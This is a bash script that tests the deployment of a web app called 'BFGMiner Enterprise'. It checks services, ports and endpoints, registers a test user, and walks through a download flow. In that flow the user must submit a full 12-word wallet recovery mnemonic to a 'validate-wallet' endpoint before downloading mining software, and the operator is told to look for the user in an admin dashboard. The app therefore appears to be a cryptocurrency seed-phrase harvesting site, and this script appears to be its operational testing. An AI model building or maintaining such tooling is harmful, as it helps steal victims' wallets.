#!/bin/bash

# BFGMiner Enterprise Verification Script
# This script verifies that the BFGMiner application is running correctly

set -e  # Exit on error

echo "=== BFGMiner Enterprise Verification ==="

# Check if services are running
echo "Checking services..."
if systemctl is-active --quiet bfgminer-main; then
    echo "✅ Main service is running"
else
    echo "❌ Main service is not running"
    echo "Run: systemctl status bfgminer-main"
fi

if systemctl is-active --quiet bfgminer-admin; then
    echo "✅ Admin service is running"
else
    echo "❌ Admin service is not running"
    echo "Run: systemctl status bfgminer-admin"
fi

if systemctl is-active --quiet nginx; then
    echo "✅ Nginx is running"
else
    echo "❌ Nginx is not running"
    echo "Run: systemctl status nginx"
fi

# Check if ports are open
echo "Checking ports..."
if netstat -tuln | grep -q ":5001 "; then
    echo "✅ Port 5001 (Main) is open"
else
    echo "❌ Port 5001 (Main) is not open"
fi

if netstat -tuln | grep -q ":5002 "; then
    echo "✅ Port 5002 (Admin) is open"
else
    echo "❌ Port 5002 (Admin) is not open"
fi

if netstat -tuln | grep -q ":80 "; then
    echo "✅ Port 80 (Nginx) is open"
else
    echo "❌ Port 80 (Nginx) is not open"
fi

# Test endpoints
echo "Testing endpoints..."
if curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/ | grep -q "200"; then
    echo "✅ Main endpoint is responding"
else
    echo "❌ Main endpoint is not responding"
fi

if curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/admin/ | grep -q "200"; then
    echo "✅ Admin endpoint is responding"
else
    echo "❌ Admin endpoint is not responding"
fi

if curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/style.css | grep -q "200"; then
    echo "✅ Style.css is accessible"
else
    echo "❌ Style.css is not accessible"
fi

echo "=== End-to-End Test ==="
echo "Performing end-to-end test..."

# Generate a random email for testing
TEST_EMAIL="test_$(date +%s)@example.com"
TEST_PASSWORD="TestPassword123!"

# Register a new user
echo "Registering user: $TEST_EMAIL"
REGISTER_RESPONSE=$(curl -s -X POST -H "Content-Type: application/json" -d "{&quot;email&quot;:&quot;$TEST_EMAIL&quot;,&quot;password&quot;:&quot;$TEST_PASSWORD&quot;}" http://127.0.0.1/api/register)
if echo "$REGISTER_RESPONSE" | grep -q "success"; then
    echo "✅ User registration successful"
else
    echo "❌ User registration failed"
    echo "Response: $REGISTER_RESPONSE"
fi

# Login
echo "Logging in as: $TEST_EMAIL"
LOGIN_RESPONSE=$(curl -s -X POST -H "Content-Type: application/json" -d "{&quot;email&quot;:&quot;$TEST_EMAIL&quot;,&quot;password&quot;:&quot;$TEST_PASSWORD&quot;}" http://127.0.0.1/api/login)
if echo "$LOGIN_RESPONSE" | grep -q "success"; then
    echo "✅ User login successful"
    # Extract token for further requests
    TOKEN=$(echo "$LOGIN_RESPONSE" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
else
    echo "❌ User login failed"
    echo "Response: $LOGIN_RESPONSE"
    TOKEN=""
fi

# Validate wallet (DEBUG mode)
if [ -n "$TOKEN" ]; then
    echo "Validating wallet (DEBUG mode)"
    WALLET_RESPONSE=$(curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d "{&quot;type&quot;:&quot;mnemonic&quot;,&quot;credentials&quot;:&quot;frequent wine code army furnace donor olive uniform ball match left divorce&quot;}" http://127.0.0.1/api/validate-wallet)
    if echo "$WALLET_RESPONSE" | grep -q "valid"; then
        echo "✅ Wallet validation successful"
    else
        echo "❌ Wallet validation failed"
        echo "Response: $WALLET_RESPONSE"
    fi
    
    # Initiate download
    echo "Initiating download"
    DOWNLOAD_RESPONSE=$(curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d "{&quot;wallet_address&quot;:&quot;0x742d35Cc6634C0532925a3b8D4C2b2e4C8b4b8b4&quot;}" http://127.0.0.1/api/download/initiate)
    if echo "$DOWNLOAD_RESPONSE" | grep -q "success"; then
        echo "✅ Download initiation successful"
        # Extract download token
        DOWNLOAD_TOKEN=$(echo "$DOWNLOAD_RESPONSE" | grep -o '"downloadToken":"[^"]*"' | cut -d'"' -f4)
        
        # Test download
        if [ -n "$DOWNLOAD_TOKEN" ]; then
            echo "Testing download with token: $DOWNLOAD_TOKEN"
            DOWNLOAD_TEST=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/download/$DOWNLOAD_TOKEN)
            if [ "$DOWNLOAD_TEST" = "200" ]; then
                echo "✅ Download successful"
            else
                echo "❌ Download failed with status: $DOWNLOAD_TEST"
            fi
        fi
    else
        echo "❌ Download initiation failed"
        echo "Response: $DOWNLOAD_RESPONSE"
    fi
fi

# Check admin dashboard for the new user
echo "Checking admin dashboard for new user..."
echo "Please manually verify that the user $TEST_EMAIL appears in the admin dashboard"
echo "Admin URL: http://127.0.0.1/admin/"

echo "=== Verification Complete ==="